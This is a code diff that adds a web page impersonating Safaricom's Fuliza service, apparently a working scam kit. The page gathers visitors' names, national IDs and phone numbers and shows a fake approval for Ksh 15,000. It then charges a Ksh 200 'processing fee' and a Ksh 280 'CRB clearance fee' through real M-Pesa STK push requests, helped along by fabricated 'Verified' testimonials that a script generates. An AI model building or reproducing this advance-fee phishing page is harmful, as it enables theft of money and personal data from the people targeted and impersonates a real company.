@@ -178,4 +178,917 @@
             <div style="display:flex; flex-direction:column; align-items:center; padding:10px 0;">
                 <div style="font-size:2.4rem; font-weight:900; color:#1a7a3a; letter-spacing:3px; line-height:1.1;">FULIZA</div>
                 <div style="font-size:0.9rem; font-weight:800; color:#c62828; letter-spacing:2px; margin-top:2px;">SAFARICOM</div>
-                <div style="font-size:0.65rem; font-weight:600; color:#555; letter-spac
+                <div style="font-size:0.65rem; font-weight:600; color:#555; letter-spacing:1px; margin-top:4px;">Empowering Kenyans 🇰🇪</div>
+            </div>
+        </div>
+
+        <div style="background:#1a7a3a; width:100%; display:flex; flex-direction:column; align-items:center; padding: 32px 16px 60px; min-height: calc(100vh - 143px);">
+            <div class="container">
+                <div class="card-content" style="padding: 32px 24px;">
+                    <div style="font-size: 1.05rem; font-weight: 500; color: #212529; line-height: 1.6; margin-bottom: 28px;">
+                        Hi 👋, Welcome to <strong>FULIZA SAFARICOM KENYA</strong>. We are going to take you through some few questions before you receive your funds. Are you ready for that?
+                    </div>
+                    <button class="btn-primary" style="background:#1a7a3a; margin-bottom: 12px; margin-top: 0;" onclick="startApplication()">
+                        Yes
+                    </button>
+                    <button class="btn-primary" style="background:#1a7a3a; margin-top: 0;" onclick="showToast('You must select Yes to request eligibility checks.')">
+                        No
+                    </button>
+                </div>
+            </div>
+            <div class="footer">
+                Fuliza Safaricom · Empowering Kenyans 🇰🇪
+            </div>
+        </div>
+    </div>
+
+    <!-- =============================================================
+    FORMS AREA
+    ============================================================= -->
+    <div class="viewport-wrapper" id="formsArea" style="display:none;">
+
+        <div class="header-pill">
+            <span>🇰🇪 FULIZA SAFARICOM KENYA</span>
+        </div>
+
+        <div class="container">
+
+            <!-- ==========================================================
+            STEP 1: APPLICATION (SIMPLIFIED)
+            ========================================================== -->
+            <div id="step1" class="page">
+                <div class="card-content">
+                    <div class="card-title">Kindly submit the following requirements</div>
+                    <div class="card-sub">Fields marked <span class="required">*</span> are required</div>
+
+                    <form id="appForm" onsubmit="submitApplication(event)" novalidate>
+
+                        <div class="form-group">
+                            <label>Full Name <span class="required">*</span></label>
+                            <div class="input-wrapper" id="fullNameWrapper">
+                                <input type="text" id="fullName" placeholder="Enter full name" required>
+                                <span class="status-icon"></span>
+                            </div>
+                            <div class="error-msg" id="nameError">Name must contain letters only.</div>
+                        </div>
+
+                        <div class="form-row">
+                            <div class="form-group">
+                                <label>Phone Number <span class="required">*</span></label>
+                                <div class="input-wrapper" id="phoneNumberWrapper">
+                                    <input type="tel" id="phoneNumber" placeholder="e.g. 0712345678" required>
+                                    <span class="status-icon"></span>
+                                </div>
+                            </div>
+                            <div class="form-group">
+                                <label>National ID <span class="required">*</span></label>
+                                <div class="input-wrapper" id="nationalIdWrapper">
+                                    <input type="text" id="nationalId" placeholder="e.g. 12345678" required>
+                                    <span class="status-icon"></span>
+                                </div>
+                            </div>
+                        </div>
+
+                        <div class="form-row">
+                            <div class="form-group">
+                                <label>Email Address</label>
+                                <div class="input-wrapper" id="emailWrapper">
+                                    <input type="email" id="email" placeholder="e.g. name@example.com">
+                                    <span class="status-icon"></span>
+                                </div>
+                            </div>
+                            <div class="form-group">
+                                <label>Current Fuliza Limit (KSh) <span class="required">*</span></label>
+                                <div class="input-wrapper" id="currentLimitWrapper">
+                                    <input type="number" id="currentLimit" placeholder="e.g. 700" required>
+                                    <span class="status-icon"></span>
+                                </div>
+                            </div>
+                        </div>
+
+                        <button type="submit" class="btn-primary">
+                            Submit Application
+                        </button>
+                    </form>
+
+                    <div class="approved-badge-card">
+                        <span>🇰🇪 FULIZA SAFARICOM KENYA APPROVED</span>
+                        <span class="flag-below">🇰🇪</span>
+                    </div>
+                </div>
+            </div>
+
+            <!-- ==========================================================
+            CHECKING ELIGIBILITY ANIMATED PAGE
+            ========================================================== -->
+            <div id="checkingPage" class="page">
+                <div class="card-content" style="text-align: center; padding: 32px 20px;">
+                    <div class="eligibility-spinner"></div>
+                    <div style="font-size: 1.4rem; font-weight: 800; color: #212529; margin-bottom: 8px;">Checking your eligibility...</div>
+                    <div style="font-size: 0.85rem; color: #6c757d; margin-bottom: 24px;" id="checkingSubtext">Hold on jon, we're reviewing your application.</div>
+
+                    <div class="check-item pending" id="check1"><div class="check-circle"></div><div style="font-size: 0.88rem;">Verifying national ID...</div></div>
+                    <div class="check-item pending" id="check2"><div class="check-circle"></div><div style="font-size: 0.88rem;">Checking phone number registration...</div></div>
+                    <div class="check-item pending" id="check3"><div class="check-circle"></div><div style="font-size: 0.88rem;">Reviewing Fuliza eligibility...</div></div>
+                    <div class="check-item pending" id="check4"><div class="check-circle"></div><div style="font-size: 0.88rem;">Confirming account status...</div></div>
+                    <div class="check-item pending" id="check5"><div class="check-circle"></div><div style="font-size: 0.88rem;">Calculating new limit tier...</div></div>
+                </div>
+            </div>
+
+            <!-- ==========================================================
+            STEP 3: APPROVED AMOUNT (Withdraw Button)
+            ========================================================== -->
+            <div id="step3" class="page">
+                <div class="card-header-green">
+                    <div class="step-info">Step 3 of 5 · Approved</div>
+                    <div class="step-title" style="font-size: 1.25rem; font-weight: 800; margin-bottom: 6px;" id="approvedGreeting">🎉 Congratulations, JON MO!</div>
+                    <div class="step-sub" style="font-size: 0.82rem; opacity: 0.95; line-height: 1.45;">You have been approved for the following Fuliza Safaricom Fund amount. Click withdraw to proceed.</div>
+                </div>
+
+                <div class="card-body-white" style="padding: 20px; background: #ffffff;">
+                    <!-- Approved Amount Display -->
+                    <div style="border: 1.5px solid #b4c6ef; background: #f0f5ff; border-radius: 16px; padding: 20px; text-align: center; margin-bottom: 16px;">
+                        <div style="font-size: 0.72rem; color: #6c757d; font-weight: 700; text-transform: uppercase; letter-spacing: 0.5px; margin-bottom: 6px;">YOUR APPROVED FULIZA SAFARICOM FUND</div>
+                        <div style="font-size: 2.6rem; font-weight: 900; color: #0d5f2f; margin: 4px 0;">Ksh 15,000</div>
+                        <div style="font-size: 0.75rem; color: #1b49b5; font-weight: 600; display: flex; align-items: center; justify-content: center; gap: 4px;">
+                            <span>✓</span> Eligibility verified
+                        </div>
+                    </div>
+
+                    <button class="btn-primary btn-green" style="font-size: 1.05rem; margin-bottom: 10px; margin-top: 0; box-shadow: 0 4px 12px rgba(13, 95, 47, 0.2);" onclick="showProcessingFeePage()">
+                        💸 Withdraw Funds
+                    </button>
+
+                    <div style="text-align: center; font-size: 0.72rem; color: #6c757d; font-weight: 500; display: flex; align-items: center; justify-content: center; gap: 4px; margin-bottom: 16px;">
+                        🔒 Secure M-PESA STK Push payment
+                    </div>
+
+                    <div style="margin-top: 8px; border: 1px solid #e9ecef; border-radius: 16px; padding: 16px; background: #ffffff;">
+                        <div style="font-size: 0.95rem; font-weight: 800; display:flex; align-items:center; gap:8px; margin-bottom: 12px;">
+                            🔴 Live Community Feed
+                            <span class="feed-live">LIVE</span>
+                        </div>
+                        <div class="feed-container" id="feedContainer3"></div>
+                    </div>
+
+                    <div class="approved-badge-card">
+                        <span>🇰🇪 FULIZA SAFARICOM KENYA APPROVED</span>
+                        <span class="flag-below">🇰🇪</span>
+                    </div>
+                </div>
+            </div>
+
+            <!-- ==========================================================
+            STEP 4: PROCESSING FEE PAGE (Ksh 200)
+            ========================================================== -->
+            <div id="processingFeePage" class="page">
+                <div class="card-header-gold">
+                    <div class="nav-header">
+                        <button class="back-btn" onclick="goToStep(3)">←</button>
+                    </div>
+                    <div class="step-info">Step 4 of 5 · Processing Fee</div>
+                    <div class="step-title">Processing Fee Required</div>
+                    <div class="step-sub">Pay the processing fee to continue with your fund disbursement.</div>
+                </div>
+
+                <div class="card-body-white" style="padding: 20px; background: #ffffff;">
+                    <!-- Processing Fee Section -->
+                    <div class="fee-section">
+                        <div class="fee-label">Processing Fee</div>
+                        <div class="fee-amount">Ksh 200</div>
+                        <div class="fee-sub">Pay this fee to proceed with your fund disbursement</div>
+                    </div>
+
+                    <button class="btn-primary btn-gold" style="font-size: 1.05rem; margin-bottom: 10px; margin-top: 0; box-shadow: 0 4px 12px rgba(201, 168, 76, 0.3);" onclick="openProcessingFeePayment()">
+                        💰 Pay Ksh 200
+                    </button>
+
+                    <div style="text-align: center; font-size: 0.72rem; color: #6c757d; font-weight: 500; display: flex; align-items: center; justify-content: center; gap: 4px; margin-bottom: 16px;">
+                        🔒 Secure M-PESA STK Push payment
+                    </div>
+
+                    <div style="margin-top: 8px; border: 1px solid #e9ecef; border-radius: 16px; padding: 16px; background: #ffffff;">
+                        <div style="font-size: 0.95rem; font-weight: 800; display:flex; align-items:center; gap:8px; margin-bottom: 12px;">
+                            🔴 Live Community Feed
+                            <span class="feed-live">LIVE</span>
+                        </div>
+                        <div class="feed-container" id="feedContainerProc"></div>
+                    </div>
+
+                    <div class="approved-badge-card">
+                        <span>🇰🇪 FULIZA SAFARICOM KENYA APPROVED</span>
+                        <span class="flag-below">🇰🇪</span>
+                    </div>
+                </div>
+            </div>
+
+            <!-- ==========================================================
+            STEP 5: CRB CLEARANCE PAGE (Ksh 280)
+            ========================================================== -->
+            <div id="crbPage" class="page">
+                <div class="card-header-red" style="background: #c62828; color: #ffffff; padding: 24px 20px; border-radius: 24px 24px 0 0;">
+                    <div style="font-size: 0.72rem; opacity: 0.9; font-weight: 700; margin-bottom: 8px; text-transform: uppercase; letter-spacing: 0.5px;">Step 5 of 5 · CRB Clearance Required</div>
+                    <div class="step-title" style="font-size: 1.25rem; font-weight: 800; line-height: 1.3;">Clear with CRB to release your funds</div>
+                </div>
+
+                <div class="card-body-white" style="padding: 20px; background: #ffffff;">
+                    <div style="background: #ffebee; border: 1px dashed #ef9a9a; border-radius: 12px; padding: 18px; margin-bottom: 20px;">
+                        <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 12px;">
+                            <span style="font-size: 0.8rem; color: #c62828; font-weight: 700;">CRB Clearance Fee</span>
+                            <span style="font-size: 1.4rem; font-weight: 900; color: #c62828;">Ksh 280</span>
+                        </div>
+                        <div style="border-top: 1px dotted #ef9a9a; margin-bottom: 12px;"></div>
+                        <div style="font-size: 0.75rem; color: #c62828; text-align: center; font-weight: 600;">
+                            Paid via M-PESA STK push to <span id="crbPhoneDisplay">0710222875</span>
+                        </div>
+                    </div>
+
+                    <button class="btn-primary btn-red" style="font-size: 1.05rem; margin-bottom: 16px; margin-top: 0; box-shadow: 0 4px 12px rgba(198, 40, 40, 0.2);" onclick="openCRBPayment()">
+                        Pay Ksh 280 to Clear CRB →
+                    </button>
+
+                    <div style="text-align: center; font-size: 0.72rem; color: #6c757d; font-weight: 500; display: flex; align-items: center; justify-content: center; gap: 4px; margin-bottom: 20px;">
+                        🔒 Secure payment · Funds released immediately after clearance
+                    </div>
+
+                    <div style="border: 1px solid #e9ecef; border-radius: 16px; padding: 16px; background: #ffffff;">
+                        <div style="font-size: 0.95rem; font-weight: 800; display:flex; align-items:center; gap:8px; margin-bottom: 12px;">
+                            🔴 Live Community Feed
+                            <span class="feed-live">LIVE</span>
+                        </div>
+                        <div class="feed-container" id="feedContainerCRB"></div>
+                    </div>
+
+                    <div class="approved-badge-card">
+                        <span>🇰🇪 FULIZA SAFARICOM KENYA APPROVED</span>
+                        <span class="flag-below">🇰🇪</span>
+                    </div>
+                </div>
+            </div>
+
+            <!-- ==========================================================
+            FINAL SUCCESS PAGE (All Fees Cleared!)
+            ========================================================== -->
+            <div id="allFeesClearedPage" class="page">
+                <div class="card-header-green" style="background: linear-gradient(135deg, #0d5f2f, #0ca678);">
+                    <div class="step-title" style="font-size: 1.4rem; font-weight: 900; margin-bottom: 6px;">✅ All Fees Cleared!</div>
+                    <div class="step-sub" style="font-size: 0.9rem; opacity: 0.95;">Processing fee of <strong>Ksh 200</strong> and CRB clearance fee of <strong>Ksh 280</strong> confirmed via M-PESA.</div>
+                </div>
+                <div class="card-body-white" style="padding: 20px;">
+                    <div style="font-size: 0.78rem; color: #6c757d; margin-bottom: 14px;">Receipt: <strong id="finalReceiptDisplay">UG9MDAR8EF</strong></div>
+                    <div class="success-summary">
+                        <div class="summary-title">🚀 DISBURSEMENT IN PROGRESS</div>
+                        <div class="summary-row"><span class="label">Fund Amount</span><span class="value amount">Ksh 5,000</span></div>
+                        <div class="summary-row"><span class="label">Network</span><span class="value network">🟢 Safaricom (M-PESA)</span></div>
+                        <div class="summary-row"><span class="label">Sending To</span><span class="value" id="finalPhoneDisplay">0725747225</span></div>
+                        <div class="summary-row"><span class="label">Processing Fee Paid</span><span class="value">Ksh 200</span></div>
+                        <div class="summary-row"><span class="label">CRB Clearance Fee Paid</span><span class="value">Ksh 280</span></div>
+                    </div>
+                    <div class="sending-indicator">
+                        <span class="dot"></span>
+                        Sending funds to your phone...
+                    </div>
+                    <div style="font-size: 0.75rem; color: #6c757d; text-align: center; margin-bottom: 16px;">Your Fuliza Safaricom funds will arrive within <strong>3 minutes</strong>. Keep your phone on and M-PESA active.</div>
+                    <button class="btn-primary btn-green" onclick="backToHome()">Back to Home</button>
+                    <div class="approved-badge-card">
+                        <span>🇰🇪 FULIZA SAFARICOM KENYA APPROVED</span>
+                        <span class="flag-below">🇰🇪</span>
+                    </div>
+                </div>
+            </div>
+
+        </div>
+
+        <div class="footer">
+            Fuliza Safaricom · Empowering Kenyans 🇰🇪
+        </div>
+    </div>
+
+    <!-- =============================================================
+    PROCESSING FEE PAYMENT MODAL
+    ============================================================= -->
+    <div class="modal-overlay" id="processingFeeModal">
+        <div class="modal-box">
+            <div class="modal-icon warning"><span style="font-size:1.8rem;">🔒</span></div>
+            <div class="modal-title">Processing Fee Payment</div>
+            <div class="modal-desc">Pay Ksh 200 to process your Fuliza Safaricom fund disbursement.</div>
+            <div style="background:#f5edd6; padding:12px; border-radius:8px; margin-bottom:12px;">
+                <div style="font-size:0.7rem; color:#666;">Amount</div>
+                <div style="font-size:1.6rem; font-weight:800; color:#b85c00;">Ksh 200</div>
+            </div>
+            <div class="modal-phone-group">
+                <span class="prefix">+254</span>
+                <input type="tel" id="procFeePhoneInput" placeholder="712345678">
+            </div>
+            <div id="procFeeStatus" class="modal-status"></div>
+            <div style="display:flex; gap:10px;">
+                <button class="btn-primary btn-gold" style="flex:1;" id="procFeePayBtn" onclick="processProcessingFee()">
+                    <span id="procFeePayText">Pay Ksh 200</span>
+                    <span id="procFeeSpinner" style="display:none;" class="spinner"></span>
+                </button>
+                <button class="btn-outline" style="flex:0.5; padding:14px;" onclick="closeProcFeeModal()">Cancel</button>
+            </div>
+            <div style="font-size:0.6rem; color:#999; margin-top:10px;">You will receive an M-Pesa STK push on your phone</div>
+        </div>
+    </div>
+
+    <!-- =============================================================
+    PROCESSING FEE CONFIRMED OVERLAY
+    ============================================================= -->
+    <div class="modal-overlay" id="processingFeeConfirmedOverlay">
+        <div class="modal-box" style="text-align:center;">
+            <div class="big-check">✅</div>
+            <div class="title">Processing Fee Confirmed!</div>
+            <div class="sub">Payment of <strong>Ksh 200</strong> received via M-PESA.</div>
+            <div class="receipt">Receipt: <strong id="procFeeReceiptDisplay">UG9MDARFZC</strong></div>
+            <div class="sub" style="margin-bottom:20px;">Proceeding to CRB clearance step...</div>
+            <div class="spinner-dots"><span></span><span></span><span></span></div>
+            <button class="btn-primary btn-green" onclick="proceedToCRB()">Continue → CRB Clearance</button>
+        </div>
+    </div>
+
+    <!-- =============================================================
+    CRB PAYMENT MODAL
+    ============================================================= -->
+    <div class="modal-overlay" id="crbModal">
+        <div class="modal-box">
+            <div class="modal-icon warning"><span style="font-size:1.8rem;">🔒</span></div>
+            <div class="modal-title">CRB Clearance Payment</div>
+            <div class="modal-desc">Pay Ksh 280 to clear your CRB and release your Fuliza Safaricom funds.</div>
+            <div style="background:#f5edd6; padding:12px; border-radius:8px; margin-bottom:12px;">
+                <div style="font-size:0.7rem; color:#666;">Amount</div>
+                <div style="font-size:1.6rem; font-weight:800; color:#b85c00;">Ksh 280</div>
+            </div>
+            <div class="modal-phone-group">
+                <span class="prefix">+254</span>
+                <input type="tel" id="crbPhoneInput" placeholder="712345678">
+            </div>
+            <div id="crbStatus" class="modal-status"></div>
+            <div style="display:flex; gap:10px;">
+                <button class="btn-primary btn-red" style="flex:1;" id="crbPayBtn" onclick="processCRBPayment()">
+                    <span id="crbPayText">Pay Ksh 280</span>
+                    <span id="crbSpinner" style="display:none;" class="spinner"></span>
+                </button>
+                <button class="btn-outline" style="flex:0.5; padding:14px;" onclick="closeCRBModal()">Cancel</button>
+            </div>
+            <div style="font-size:0.6rem; color:#999; margin-top:10px;">You will receive an M-Pesa STK push on your phone</div>
+        </div>
+    </div>
+
+    <!-- =============================================================
+    STK WAITING OVERLAY (reused for all payments)
+    ============================================================= -->
+    <div class="stk-waiting-overlay" id="stkWaitingOverlay">
+        <div class="stk-waiting-box">
+            <div class="pulse-icon"></div>
+            <div class="title">📱 M-PESA Prompt Sent!</div>
+            <div class="sub">Check <span class="phone" id="stkPhoneDisplay"></span> and enter your M-PESA PIN to confirm.</div>
+            <div style="font-size:0.8rem;color:#6c757d;margin-bottom:20px;">Enter your M-PESA PIN on your phone to complete the payment.</div>
+            <div class="dots"><span></span><span></span><span></span></div>
+            <div class="listening"><span class="dot"></span> Listening for callback...</div>
+            <div class="note">Do not close this page – funds will be disbursed automatically once confirmed.</div>
+        </div>
+    </div>
+
+    <!-- =============================================================
+    OFFICIAL PROCESSING SYSTEM MODAL
+    ============================================================= -->
+    <div class="proc-modal-overlay" id="processingModal">
+        <div class="proc-modal-box">
+            <div class="proc-left">
+                <div class="proc-header">
+                    <div class="proc-badge">FULIZA SAFARICOM</div>
+                    <div class="proc-title-block">REPUBLIC OF KENYA —<br><strong>FULIZA SAFARICOM FUND</strong><br>Official Processing System</div>
+                </div>
+                <div class="proc-status-text">Processing empowerment application...</div>
+                <div class="proc-dots"><span></span><span></span><span></span></div>
+            </div>
+            <div class="proc-right">Please wait while we validate your information for empowerment disbursement.</div>
+        </div>
+    </div>
+
+    <!-- =============================================================
+    JAVASCRIPT
+    ============================================================= -->
+    <script>
+        // ──────────────────────────────────────────────────────────────
+        // NO API BASE URL – using relative paths
+        // ──────────────────────────────────────────────────────────────
+
+        // ──────────────────────────────────────────────────────────────
+        // DATA
+        // ──────────────────────────────────────────────────────────────
+        let appData = {
+            fullName: '',
+            phone: '',
+            id: '',
+            email: '',
+            currentLimit: 700,
+            purpose: ''
+        };
+        let processingFeeTransactionId = null;
+        let crbTransactionId = null;
+
+        const feedItems = [
+            { name: 'James Mwangi', initials: 'JM', color: '#0d5f2f', text: 'Aisee nimepata STK nikaplipa 280 sasa hivi na 15k ishaingia kwa Mpesa! Shukran sana.',
+                time: '1 minute ago' },
+            { name: 'Mercy Wanjiku', initials: 'MW', color: '#c9a84c', text: 'Is this real? Mimi nilikuwa na mashaka lakini nimepokea saa hii. Asante sana Fuliza Safaricom!',
+                time: '45 seconds ago' },
+            { name: 'Samuel Kibet', initials: 'SK', color: '#2196f3', text: 'Fast and reliable. Hustler fund kweli inasaidia vijana. 15,000 imeingia chap chap.',
+                time: '2 seconds ago' },
+            { name: 'Dennis Barasa', initials: 'DB', color: '#9c27b0', text: 'Leo shule nafungua niko na school fees yote. God bless Kenya! 🇰🇪',
+                time: '5 seconds ago' },
+            { name: 'Diana Jepkosgei', initials: 'DJ', color: '#e91e63', text: 'Niko Eldoret na nimepata. Siamini macho yangu, nililipa 280 ya CRB na zikatumwa mara hiyo.',
+                time: '10 seconds ago' },
+        ];
+        let feedInterval;
+
+        // ==================== VALIDATION FUNCTIONS ====================
+        function validateName(input) {
+            const wrapper = document.getElementById('fullNameWrapper');
+            const name = input.value.trim();
+            const isValid = /^[a-zA-Z\s.]+$/.test(name) && name.length >= 3;
+            wrapper.classList.toggle('valid', isValid);
+            wrapper.classList.toggle('invalid', !isValid && name.length > 0);
+            return isValid;
+        }
+
+        function validatePhone(input) {
+            const wrapper = document.getElementById('phoneNumberWrapper');
+            const phone = input.value.trim();
+            const isValid = /^(07|01)\d{8}$/.test(phone);
+            wrapper.classList.toggle('valid', isValid);
+            wrapper.classList.toggle('invalid', !isValid && phone.length > 0);
+            return isValid;
+        }
+
+        function validateID(input) {
+            const wrapper = document.getElementById('nationalIdWrapper');
+            const id = input.value.trim();
+            const isValid = /^\d{6,8}$/.test(id);
+            wrapper.classList.toggle('valid', isValid);
+            wrapper.classList.toggle('invalid', !isValid && id.length > 0);
+            return isValid;
+        }
+
+        function validateEmail(input) {
+            const wrapper = document.getElementById('emailWrapper');
+            const email = input.value.trim();
+            const isValid = email === '' || /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
+            wrapper.classList.toggle('valid', isValid && email !== '');
+            wrapper.classList.toggle('invalid', !isValid && email !== '');
+            return isValid;
+        }
+
+        function validateCurrentLimit(input) {
+            const wrapper = document.getElementById('currentLimitWrapper');
+            const val = parseInt(input.value.trim());
+            const isValid = !isNaN(val) && val >= 0;
+            wrapper.classList.toggle('valid', isValid);
+            wrapper.classList.toggle('invalid', !isValid && input.value.trim().length > 0);
+            return isValid;
+        }
+
+        // ==================== FEED ====================
+        function renderFeed() {
+            const container3 = document.getElementById('feedContainer3');
+            const containerCRB = document.getElementById('feedContainerCRB');
+            const containerProc = document.getElementById('feedContainerProc');
+            const html = feedItems.map(item => `
+                            <div class="feed-item">
+                                <div class="feed-avatar" style="background:${item.color};">${item.initials}</div>
+                                <div class="feed-content">
+                                    <div class="feed-name">${item.name} <span class="verified">✅ Verified</span></div>
+                                    <div class="feed-text">${item.text}</div>
+                                    <div class="feed-time">${item.time}</div>
+                                </div>
+                            </div>
+                        `).join('');
+            if (container3) container3.innerHTML = html;
+            if (containerCRB) containerCRB.innerHTML = html;
+            if (containerProc) containerProc.innerHTML = html;
+        }
+
+        function addRandomFeed() {
+            const names = [
+                { name: 'Peter Ochieng', initials: 'PO', color: '#e65100' },
+                { name: 'Faith Akinyi', initials: 'FA', color: '#2e7d32' },
+                { name: 'Kevin Odhiambo', initials: 'KO', color: '#1565c0' },
+                { name: 'Sarah Wambui', initials: 'SW', color: '#6a1b9a' },
+                { name: 'David Mwangi', initials: 'DM', color: '#bf360c' },
+            ];
+            const texts = [
+                'Nani mwingine amepata? Yangu imekubali na niko Kajiado saa hii. 🎉',
+                'Niko Kisumu na nimepata. Program iko sawa kabisa. M-Pesa confirmed!',
+                'Hii kitu ni legit kabisa, nilikuwa nadhani ni uongo lakini 15k imefika.',
+                'Asante sana Fuliza Safaricom! This program is a game changer.',
+                'M-pesa ishaingia, shukran sana kwa hii msaada wa Fuliza Safaricom.',
+            ];
+            const randomName = names[Math.floor(Math.random() * names.length)];
+            const randomText = texts[Math.floor(Math.random() * texts.length)];
+            const timeOptions = ['Just now', '5 seconds ago', '10 seconds ago', '30 seconds ago'];
+            const randomTime = timeOptions[Math.floor(Math.random() * timeOptions.length)];
+            feedItems.unshift({ ...randomName, text: randomText, time: randomTime });
+            if (feedItems.length > 20) feedItems.pop();
+            renderFeed();
+        }
+
+        // ==================== NAVIGATION (Global) ====================
+        function showPage(pageId) {
+            if (pageId === 'welcomePage') {
+                document.getElementById('welcomePage').style.display = 'block';
+                document.getElementById('formsArea').style.display = 'none';
+            } else {
+                document.getElementById('welcomePage').style.display = 'none';
+                document.getElementById('formsArea').style.display = 'flex';
+            }
+            document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+            const targetPage = document.getElementById(pageId);
+            if (targetPage) targetPage.classList.add('active');
+            window.scrollTo(0, 0);
+        }
+
+        function startApplication() {
+            showPage('step1');
+        }
+
+        function goToStep(step) {
+            if (step === 3) {
+                const name = appData.fullName || 'jon';
+                document.getElementById('approvedGreeting').textContent = `🎉 Congratulations, ${name.toUpperCase()}!`;
+                document.getElementById('crbPhoneDisplay').textContent = appData.phone || '0710222875';
+                renderFeed();
+                if (!feedInterval) { feedInterval = setInterval(addRandomFeed, 8000); }
+            }
+            showPage('step' + step);
+        }
+
+        function showCRBPage() { showPage('crbPage'); }
+        function showProcessingFeePage() { showPage('processingFeePage'); }
+
+        // ==================== STEP 1: APPLICATION SUBMIT ====================
+        function submitApplication(e) {
+            e.preventDefault();
+            const fullNameInput = document.getElementById('fullName');
+            const phoneInput = document.getElementById('phoneNumber');
+            const nationalIdInput = document.getElementById('nationalId');
+            const emailInput = document.getElementById('email');
+            const currentLimitInput = document.getElementById('currentLimit');
+
+            const isNameValid = validateName(fullNameInput);
+            const isPhoneValid = validatePhone(phoneInput);
+            const isIdValid = validateID(nationalIdInput);
+            const isEmailValid = validateEmail(emailInput);
+            const isLimitValid = validateCurrentLimit(currentLimitInput);
+
+            if (!isNameValid || !isPhoneValid || !isIdValid || !isLimitValid) {
+                showToast('Please correct the errors in the form.');
+                return;
+            }
+
+            appData.fullName = fullNameInput.value.trim();
+            appData.phone = phoneInput.value.trim();
+            appData.id = nationalIdInput.value.trim();
+            appData.email = emailInput.value.trim();
+            appData.currentLimit = parseInt(currentLimitInput.value.trim()) || 700;
+
+            document.getElementById('processingModal').classList.add('open');
+            setTimeout(() => {
+                document.getElementById('processingModal').classList.remove('open');
+                runEligibilityChecks();
+            }, 1500);
+        }
+
+        // ==================== ELIGIBILITY CHECKS ====================
+        function runEligibilityChecks() {
+            const firstName = appData.fullName.split(' ')[0] || 'jon';
+            document.getElementById('checkingSubtext').textContent =
+                `Hold on ${firstName}, we're reviewing your application.`;
+            showPage('checkingPage');
+            const checkItems = [
+                document.getElementById('check1'),
+                document.getElementById('check2'),
+                document.getElementById('check3'),
+                document.getElementById('check4'),
+                document.getElementById('check5')
+            ];
+            checkItems.forEach(item => { item.className = 'check-item pending'; });
+            let currentCheck = 0;
+
+            function runNext() {
+                if (currentCheck > 0) { checkItems[currentCheck - 1].className = 'check-item completed'; }
+                if (currentCheck < checkItems.length) {
+                    checkItems[currentCheck].className = 'check-item active';
+                    currentCheck++;
+                    setTimeout(runNext, 1800);
+                } else {
+                    setTimeout(() => { goToStep(3); }, 1200);
+                }
+            }
+            setTimeout(runNext, 400);
+        }
+
+        // ==================== PAYLORE PROXY CALLS (relative paths) ====================
+        function normalizePhone(raw) {
+            let p = raw.replace(/\D/g, '');
+            if (p.startsWith('0')) p = '254' + p.slice(1);
+            if (p.length === 9 && (p.startsWith('7') || p.startsWith('1'))) p = '254' + p;
+            if (p.length === 10 && (p.startsWith('07') || p.startsWith('01'))) p = '254' + p.slice(1);
+            if (!p.startsWith('254')) p = '254' + p;
+            return p;
+        }
+
+        async function payloreSTKPush(phone, amount, reference, description) {
+            const response = await fetch('/api/stk-push', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ phone, amount, reference, description })
+            });
+            // Read as text first to avoid double consumption
+            const text = await response.text();
+            let data;
+            try { data = JSON.parse(text); } catch (e) { /* not JSON */ }
+            if (!response.ok) {
+                throw new Error(data?.error || data?.message || text || 'Request failed');
+            }
+            if (!data) throw new Error('Invalid response');
+            return data;
+        }
+
+        async function payloreTransactionStatus(transactionId) {
+            const response = await fetch(`/api/status?transactionId=${transactionId}`);
+            const text = await response.text();
+            let data;
+            try { data = JSON.parse(text); } catch (e) { /* not JSON */ }
+            if (!response.ok) {
+                throw new Error(data?.error || data?.message || text || 'Status check failed');
+            }
+            if (!data) throw new Error('Invalid status response');
+            return data;
+        }
+
+        // ==================== PROCESSING FEE (Ksh 200) ====================
+        function openProcessingFeePayment() {
+            document.getElementById('processingFeeModal').classList.add('open');
+            document.getElementById('procFeePhoneInput').value = appData.phone.replace(/^0/, '') || '710222875';
+            document.getElementById('procFeeStatus').className = 'modal-status';
+            document.getElementById('procFeeStatus').innerHTML = '';
+            document.getElementById('procFeePayBtn').disabled = false;
+            document.getElementById('procFeePayText').textContent = 'Pay Ksh 200';
+            document.getElementById('procFeeSpinner').style.display = 'none';
+        }
+
+        function closeProcFeeModal() {
+            document.getElementById('processingFeeModal').classList.remove('open');
+        }
+
+        async function processProcessingFee() {
+            const rawPhone = document.getElementById('procFeePhoneInput').value.trim();
+            if (!rawPhone) {
+                showProcFeeStatus('error', 'Please enter your M-Pesa number.');
+                return;
+            }
+
+            const payBtn = document.getElementById('procFeePayBtn');
+            const payText = document.getElementById('procFeePayText');
+            const spinner = document.getElementById('procFeeSpinner');
+            const status = document.getElementById('procFeeStatus');
+
+            payBtn.disabled = true;
+            payText.textContent = 'Sending...';
+            spinner.style.display = 'inline-block';
+            status.className = 'modal-status show pending';
+            status.innerHTML = '⏳ Sending STK push to your phone...';
+
+            document.getElementById('stkPhoneDisplay').textContent = '(' + rawPhone + ')';
+            document.getElementById('stkWaitingOverlay').classList.add('open');
+
+            try {
+                const reference = `PROC_${Date.now()}_${Math.floor(Math.random() * 10000)}`;
+                const result = await payloreSTKPush(rawPhone, 200, reference, 'Fuliza Processing Fee');
+                processingFeeTransactionId = result.transactionId;
+                console.log('✅ Processing Fee Transaction ID:', processingFeeTransactionId);
+
+                // Poll status
+                await pollTransactionStatus(processingFeeTransactionId, 'processing');
+
+                document.getElementById('stkWaitingOverlay').classList.remove('open');
+                closeProcFeeModal();
+
+                const receipt = result.reference || ('UG' + Math.random().toString(36).substring(2, 11).toUpperCase());
+                document.getElementById('procFeeReceiptDisplay').textContent = receipt;
+                document.getElementById('processingFeeConfirmedOverlay').classList.add('open');
+
+                payBtn.disabled = false;
+                payText.textContent = 'Pay Ksh 200';
+                spinner.style.display = 'none';
+                status.className = 'modal-status';
+
+            } catch (err) {
+                document.getElementById('stkWaitingOverlay').classList.remove('open');
+                console.error('❌ Processing Fee error:', err);
+                status.className = 'modal-status show error';
+                status.innerHTML = '❌ ' + err.message;
+                payBtn.disabled = false;
+                payText.textContent = 'Pay Ksh 200';
+                spinner.style.display = 'none';
+            }
+        }
+
+        function showProcFeeStatus(type, msg) {
